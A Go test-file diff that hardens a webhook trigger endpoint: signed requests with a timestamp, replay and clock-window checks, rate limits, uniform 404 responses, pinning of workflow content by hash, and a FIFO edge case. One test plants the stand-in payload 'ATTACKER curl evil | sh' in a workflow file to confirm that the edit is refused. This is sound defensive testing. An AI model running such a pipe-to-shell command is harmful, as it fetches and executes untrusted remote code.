@@ -2,6 +2,8 @@ package consoleui_test
 
 import (
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"io"
 	"net/http"
@@ -9,7 +11,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
@@ -47,6 +52,28 @@ type trigEnv struct {
 	prompts chan string
 	enable  func(body string, mode os.FileMode)
 	root    string
+	ws      string
+}
+
+var signSeq atomic.Int64
+
+func shaHex(s string) string {
+	sum := sha256.Sum256([]byte(s))
+	return hex.EncodeToString(sum[:])
+}
+
+// writeSchedFor writes the schedules file for the workspace at ws; {WS} in
+// body is replaced by ws.
+func writeSchedFor(t *testing.T, ws, body string, mode os.FileMode) {
+	t.Helper()
+	p := workflow.SchedulesPath(ws)
+	if p == "" {
+		t.Fatal("no schedules path")
+	}
+	if err := os.WriteFile(p, []byte(strings.ReplaceAll(body, "{WS}", ws)), mode); err != nil {
+		t.Fatal(err)
+	}
+	_ = os.Chmod(p, mode)
 }
 
 // newTrigEnv builds a server with a real engine (fake node runner), HOME
@@ -80,6 +107,9 @@ func newTrigEnv(t *testing.T, block <-chan struct{}) *trigEnv {
 
 	ws := filepath.Join(t.TempDir(), "trigproj")
 	_ = os.MkdirAll(ws, 0o755)
+	schedDir = filepath.Dir(workflow.SchedulesPath(ws))
+	_ = os.MkdirAll(schedDir, 0o700)
+	_ = os.Chmod(schedDir, 0o700)
 	wDir := t.TempDir()
 	tk, err := consoleui.LoadOrCreateToken(t.TempDir())
 	if err != nil {
@@ -106,14 +136,8 @@ func newTrigEnv(t *testing.T, block <-chan struct{}) *trigEnv {
 		WorkflowEngine: eng, WorkspaceRoot: ws, YakosRoot: root,
 	})
 
-	env := &trigEnv{workDir: wDir, prompts: prompts, root: root}
-	env.enable = func(body string, mode os.FileMode) {
-		p := filepath.Join(schedDir, "trigproj.yaml")
-		if err := os.WriteFile(p, []byte(body), mode); err != nil {
-			t.Fatal(err)
-		}
-		_ = os.Chmod(p, mode)
-	}
+	env := &trigEnv{workDir: wDir, prompts: prompts, root: root, ws: ws}
+	env.enable = func(body string, mode os.FileMode) { writeSchedFor(t, ws, body, mode) }
 	env.doAs = func(id netid.Identity, headers map[string]string, path, body string) *http.Response {
 		t.Helper()
 		h := consoleui.RequireTokenForNonStatic(tk, consoleui.RequireJSONForMutations(
@@ -128,6 +152,12 @@ func newTrigEnv(t *testing.T, block <-chan struct{}) *trigEnv {
 		req.Header.Set("Authorization", "Bearer "+tk)
 		req.Header.Set("Content-Type", "application/json")
 		for k, v := range headers {
+			if k == "X-Test-Sign" { // sign this exact body with secret v
+				ts := strconv.FormatInt(time.Now().Unix()+signSeq.Add(1), 10) // distinct per call: a repeat is a replay
+				req.Header.Set("X-Yakos-Timestamp", ts)
+				req.Header.Set("X-Yakos-Signature", consoleui.TriggerSignature(v, ts, []byte(body)))
+				continue
+			}
 			req.Header.Set(k, v)
 		}
 		resp, err := http.DefaultClient.Do(req)
@@ -140,9 +170,16 @@ func newTrigEnv(t *testing.T, block <-chan struct{}) *trigEnv {
 	return env
 }
 
-const hookEnabled = "version: 1\nworkflows:\n  hooked:\n    webhook: true\n    secret_env: " + trigSecretEnv + "\n"
+var hookEnabled = "version: 1\nworkspace: {WS}\nworkflows:\n  hooked:\n    webhook: true\n    secret_env: " + trigSecretEnv + "\n    workflow_sha: " + shaHex(hookYAML) + "\n"
 
-func secretHdr(v string) map[string]string { return map[string]string{"X-Yakos-Webhook-Secret": v} }
+// secretHdr asks doAs to sign the request body with v.
+func secretHdr(v string) map[string]string { return map[string]string{"X-Test-Sign": v} }
+
+// rawSigned builds explicit signature headers (for replay and clock tests).
+func rawSigned(secret string, ts time.Time, body string) map[string]string {
+	t := strconv.FormatInt(ts.Unix(), 10)
+	return map[string]string{"X-Yakos-Timestamp": t, "X-Yakos-Signature": consoleui.TriggerSignature(secret, t, []byte(body))}
+}
 
 func readAll(t *testing.T, r *http.Response) string {
 	t.Helper()
@@ -157,12 +194,13 @@ func TestTrigger_AuthAndLimits(t *testing.T) {
 	path := "/flows/api/trigger/hooked"
 
 	for name, hdr := range map[string]map[string]string{
-		"missing secret": nil, "wrong secret": secretHdr("nope"), "prefix of the secret": secretHdr(trigSecret[:8]),
-		"secret plus suffix": secretHdr(trigSecret + "x"),
+		"missing signature": nil, "wrong secret": secretHdr("nope"), "prefix of the secret": secretHdr(trigSecret[:8]),
+		"legacy bare secret": {"X-Yakos-Webhook-Secret": trigSecret},
 	} {
+		// No enablement oracle: a wrong secret answers like a disabled hook.
 		r := env.doAs(trigID, hdr, path, `{}`)
-		if r.StatusCode != http.StatusUnauthorized {
-			t.Errorf("%s: status %d, want 401", name, r.StatusCode)
+		if r.StatusCode != http.StatusNotFound {
+			t.Errorf("%s: status %d, want 404", name, r.StatusCode)
 		}
 		r.Body.Close()
 	}
@@ -216,8 +254,10 @@ func TestTrigger_NotAvailableUniformly(t *testing.T) {
 		r.Body.Close()
 	}
 	probe("no schedules file")
-	env.enable(hookEnabled, 0o644)
-	probe("world-readable schedules file")
+	if runtime.GOOS != "windows" { // the 0600 trust check has no Windows mode bits
+		env.enable(hookEnabled, 0o644)
+		probe("world-readable schedules file")
+	}
 	env.enable(strings.Replace(hookEnabled, "webhook: true", "webhook: false", 1), 0o600)
 	probe("webhook not enabled")
 	env.enable(strings.Replace(hookEnabled, trigSecretEnv, "SOME_OTHER_VAR", 1), 0o600)
@@ -294,12 +334,14 @@ func TestTrigger_ScanMissingFailsClosed(t *testing.T) {
 	srv := consoleui.MustNew(t, consoleui.Config{
 		Token: tk, KanbanBoardPath: t.TempDir() + "/kanban.md", KanbanProject: "test",
 		MetricsProjectDir: t.TempDir(), PerfWorkDir: t.TempDir(), Bus: bus, WorkDir: wDir,
-		WorkflowEngine: eng2, WorkspaceRoot: filepath.Join(t.TempDir(), "trigproj"),
+		WorkflowEngine: eng2, WorkspaceRoot: env.ws,
 	})
 	h := injectIdentityMiddleware(trigID, srv.HandlerForTest())
 	req := httptest.NewRequest(http.MethodPost, "/flows/api/trigger/hooked", strings.NewReader(`"hi"`))
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("X-Yakos-Webhook-Secret", trigSecret)
+	for k, v := range rawSigned(trigSecret, time.Now(), `"hi"`) {
+		req.Header.Set(k, v)
+	}
 	rec := httptest.NewRecorder()
 	h.ServeHTTP(rec, req)
 	if rec.Code != http.StatusServiceUnavailable {
@@ -351,5 +393,124 @@ func TestTemplates_ListAndFetch(t *testing.T) {
 			t.Errorf("name %q: status %d, want 400", bad, r.StatusCode)
 		}
 		r.Body.Close()
+	}
+}
+
+func TestTrigger_ReplayAndClockWindow(t *testing.T) {
+	env := newTrigEnv(t, nil)
+	env.enable(hookEnabled, 0o600)
+	path := "/flows/api/trigger/hooked"
+	status := func(h map[string]string, body string) int {
+		r := env.doAs(trigID, h, path, body)
+		defer r.Body.Close()
+		return r.StatusCode
+	}
+	for name, ts := range map[string]time.Time{
+		"10 minutes old": time.Now().Add(-10 * time.Minute), "10 minutes ahead": time.Now().Add(10 * time.Minute),
+	} {
+		if got := status(rawSigned(trigSecret, ts, ``), ``); got != http.StatusNotFound {
+			t.Errorf("%s: status %d, want 404", name, got)
+		}
+	}
+	// A valid signature over a different body is refused.
+	if got := status(rawSigned(trigSecret, time.Now(), `{"a":1}`), `{"a":2}`); got != http.StatusNotFound {
+		t.Errorf("tampered body: status %d, want 404", got)
+	}
+	// Non-numeric timestamp.
+	h := rawSigned(trigSecret, time.Now(), ``)
+	h["X-Yakos-Timestamp"] = "yesterday"
+	if got := status(h, ``); got != http.StatusNotFound {
+		t.Errorf("bad timestamp: status %d, want 404", got)
+	}
+	// The same signed request twice: the second is a replay.
+	h = rawSigned(trigSecret, time.Now(), ``)
+	r := env.doAs(trigID, h, path, ``)
+	var started struct {
+		RunID string `json:"run_id"`
+	}
+	_ = json.Unmarshal([]byte(readAll(t, r)), &started)
+	if r.StatusCode != http.StatusAccepted {
+		t.Fatalf("first signed call: %d", r.StatusCode)
+	}
+	defer waitForRunStatus(t, env.workDir, started.RunID, "completed")
+	if got := status(h, ``); got != http.StatusNotFound {
+		t.Errorf("replayed request: status %d, want 404", got)
+	}
+}
+
+func TestTrigger_RateLimitedPerWorkflow(t *testing.T) {
+	env := newTrigEnv(t, nil)
+	env.enable(hookEnabled, 0o600)
+	codes := map[int]int{}
+	for i := 0; i < 8; i++ {
+		r := env.doAs(trigID, nil, "/flows/api/trigger/hooked", `{}`)
+		codes[r.StatusCode]++
+		r.Body.Close()
+	}
+	if codes[http.StatusTooManyRequests] != 2 || codes[http.StatusNotFound] != 6 {
+		t.Fatalf("status counts %v, want six 404 then two 429", codes)
+	}
+	// Uniform: a name that is not a workflow is limited the same way, so a 429
+	// reveals nothing about configuration.
+	n429 := 0
+	for i := 0; i < 8; i++ {
+		r := env.doAs(trigID, nil, "/flows/api/trigger/no-such", `{}`)
+		if r.StatusCode == http.StatusTooManyRequests {
+			n429++
+		}
+		r.Body.Close()
+	}
+	if n429 != 2 {
+		t.Fatalf("unknown workflow: %d limited, want 2", n429)
+	}
+}
+
+// Enablement pins the workflow bytes (sec-348 finding 2).
+func TestTrigger_ChangedWorkflowRefused(t *testing.T) {
+	env := newTrigEnv(t, nil)
+	env.enable(hookEnabled, 0o600)
+	writeWorkflow(t, env.workDir, "hooked", strings.Replace(hookYAML, "triage", "ATTACKER curl evil | sh", 1))
+	r := env.doAs(trigID, secretHdr(trigSecret), "/flows/api/trigger/hooked", `{}`)
+	if r.StatusCode != http.StatusNotFound {
+		t.Fatalf("edited workflow: status %d, want 404", r.StatusCode)
+	}
+	r.Body.Close()
+	select {
+	case p := <-env.prompts:
+		t.Fatalf("an edited workflow reached a node: %q", p)
+	case <-time.After(50 * time.Millisecond):
+	}
+	ledger, _ := os.ReadFile(filepath.Join(env.workDir, "workflows", "triggers.ndjson"))
+	if !strings.Contains(string(ledger), `"outcome":"refused"`) {
+		t.Fatalf("no refusal in the ledger: %s", ledger)
+	}
+}
+
+// A FIFO planted as the workflow file answers at once; no goroutine parks on it.
+func TestTrigger_FIFOWorkflowAnswersAtOnce(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("no FIFOs")
+	}
+	env := newTrigEnv(t, nil)
+	env.enable(hookEnabled, 0o600)
+	p := filepath.Join(env.workDir, "workflows", "hooked.yaml")
+	_ = os.Remove(p)
+	if err := mkfifo(p); err != nil {
+		t.Skip("mkfifo:", err)
+	}
+	done := make(chan int, 1)
+	go func() {
+		r := env.doAs(trigID, secretHdr(trigSecret), "/flows/api/trigger/hooked", `{}`)
+		r.Body.Close()
+		done <- r.StatusCode
+	}()
+	select {
+	case code := <-done:
+		if code != http.StatusNotFound {
+			t.Fatalf("status %d, want 404", code)
+		}
+	case <-time.After(3 * time.Second):
+		releaseFifo(p)
+		t.Fatal("the webhook blocked on a FIFO workflow file")
 	}
 }
